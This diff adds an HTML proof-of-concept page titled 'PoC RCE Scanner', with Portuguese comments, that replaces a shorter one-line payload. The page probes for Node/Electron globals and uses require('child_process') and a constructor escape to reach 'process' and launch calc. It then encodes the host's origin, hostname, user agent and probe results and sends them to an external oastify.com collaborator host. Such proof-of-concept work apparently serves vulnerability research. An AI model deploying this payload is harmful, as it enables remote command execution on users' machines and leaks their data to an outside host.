@@ -1,3 +1,59 @@
-<script>
-  window.constructor.constructor("return process")().mainModule.require('child_process').exec('calc.exe');
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC RCE Scanner</title>
+</head>
+<body>
+  <h1>Scanning...</h1>
+
+  <script>
+    (async () => {
+      const result = {
+        origin: location.origin,
+        hostname: location.hostname,
+        userAgent: navigator.userAgent,
+        dangerousGlobals: [],
+        rce: {
+          hasRequire: false,
+          hasProcess: false,
+          processVersion: null,
+          childProcessExec: false,
+          error: null
+        }
+      };
+
+      // Coletar objetos suspeitos
+      const keys = Object.keys(window);
+      result.dangerousGlobals = keys.filter(k => {
+        try {
+          return ["require", "process", "electron", "node", "appShell"].includes(k) ||
+                 typeof window[k] === "function" || typeof window[k] === "object";
+        } catch {
+          return false;
+        }
+      });
+
+      // Tentar abusar de require/process
+      try {
+        if ("require" in window) {
+          result.rce.hasRequire = true;
+          const cp = window.require('child_process');
+          cp.exec('calc'); // tentativa de RCE silenciosa
+          result.rce.childProcessExec = true;
+        }
+
+        const proc = window.constructor.constructor("return process")();
+        result.rce.hasProcess = true;
+        result.rce.processVersion = proc.version;
+      } catch (e) {
+        result.rce.error = String(e);
+      }
+
+      // Enviar resultado em 1 única request
+      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
+      const url = "https://j9tu8az13ssynazi9fayiqrv8med23qs.oastify.com/?resposta=" + base64;
+      (new Image()).src = url;
+    })();
+  </script>
+</body>
+</html>
